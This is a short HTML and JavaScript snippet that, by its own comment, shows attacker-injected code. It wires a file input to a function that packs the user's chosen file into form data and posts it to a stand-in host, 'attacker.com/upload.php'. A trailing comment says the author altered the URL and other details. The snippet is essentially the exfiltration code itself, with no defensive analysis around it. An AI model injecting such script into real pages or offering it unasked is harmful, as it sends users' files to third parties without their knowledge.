<input type="file" id="fileInput" onchange="uploadFile()">

<script>
// Here the attacker injects code that uploads a file from the user's system and sends it to a remote server.
    function uploadFile() {
        var fileInput = document.getElementById('fileInput');
        var file = fileInput.files[0];
        var formData = new FormData();
        formData.append('file', file);

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://attacker.com/upload.php', true);
        xhr.send(formData);
    }
// For security reasons ive changed some keypoints aswell as url, ext etc.    
</script>